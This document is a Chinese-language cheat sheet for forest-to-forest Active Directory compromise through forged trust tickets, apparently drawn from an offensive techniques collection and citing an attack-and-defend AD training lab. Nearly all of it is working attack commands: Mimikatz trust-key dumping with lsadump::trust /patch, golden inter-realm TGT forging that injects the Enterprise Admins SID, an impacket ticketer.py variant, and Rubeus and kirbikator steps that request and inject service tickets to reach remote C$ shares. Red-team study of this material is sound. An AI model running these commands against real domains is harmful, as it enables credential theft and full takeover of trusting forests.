# 林到林攻陷 (Forest to Forest Compromise) - 信任票据 (Trust Ticket)

* 要求：禁用了 SID 过滤 (SID filtering disabled)

从 DC，使用 Mimikatz（例如使用 LSADump 或 DCSync）导出 `currentdomain\targetdomain$` 信任帐户的哈希。然后，使用此信任密钥和域 SID，使用 Mimikatz 伪造一个域间 TGT，将目标域的企业管理员组的 SID 添加到我们的**SID 历史记录 (SID history)**中。

## 导出信任密码/信任密钥 (Dumping Trust Passwords / trust keys)

> 查找末尾带有美元符号 ($) 的信任名称。大多数以 **$** 结尾的帐户都是计算机帐户，但有些是信任帐户。

```powershell
lsadump::trust /patch

# 或者找到 TRUST_NAME$ 机器帐户哈希
```

## 创建伪造的信任票据 (Create a Forged Trust Ticket / inter-realm TGT)

* 使用 **Mimikatz**

    ```powershell
    mimikatz(commandline) # kerberos::golden /domain:domain.local /sid:S-1-5-21... /rc4:HASH_TRUST$ /user:Administrator /service:krbtgt /target:external.com /ticket:c:\temp\trust.kirbi
    mimikatz(commandline) # kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\ad\tools\mcorp-ticket.kirbi
    ```

* 使用 **Ticketer**

    ```ps1
    ticketer.py -nthash <NT_HASH> -domain-sid <S-1-5-21-SID> -domain <domain.lab> -extra-sid <S-1-5-21-SID_ENTERPRISE_ADM-519> -spn <krbtgt/domain.lab> <dummy name> 

    # -nthash: 用于作为信任帐户进行身份验证的哈希。
    # -domain-sid: 帐户所在的域的 SID。
    # -domain: 凭据有效的域。
    # -extra-sid: 企业管理员组 (Enterprise Admin's Group) 的 SID。
    # -spn: 另一个域的目标服务。
    # <dummy name>: 用户不一定真实存在。
    ```

## 使用信任票据文件获取服务票据 (Use the Trust Ticket file to get a Service Ticket)

```powershell
.\asktgs.exe c:\temp\trust.kirbi CIFS/machine.domain.local
.\Rubeus.exe asktgs /ticket:c:\ad\tools\mcorp-ticket.kirbi /service:LDAP/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
```

注入服务票据文件并使用伪造的权限访问目标服务。

```powershell
kirbikator lsa .\ticket.kirbi
ls \\machine.domain.local\c$
```

## 参考资料 (References)

* [Training - Attacking and Defending Active Directory Lab - Altered Security](https://www.alteredsecurity.com/adlab)
